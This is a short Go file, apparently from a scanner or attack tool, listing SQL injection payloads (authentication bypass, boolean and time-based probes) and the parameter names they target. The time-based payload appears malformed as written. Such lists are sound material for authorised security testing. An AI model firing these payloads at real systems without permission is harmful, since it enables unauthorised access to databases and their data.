package payloads

// For sqliAttack Function

var SqliKnownCommonPayloads = []string{
	"id",
	"user_id",
	"ID",
	"user_ID",
	"uuid",
	"document",
	"user",
}


var SqliPayloads = map[string]string{
	"Basic" : "' OR '1'='1'--",
	"Bool_True" : "' AND '1'='1'--",
	"Bool_False" : "' AND '1'='2'--", 
	"Time_Sleep" : "' SLEEP(5)--",
}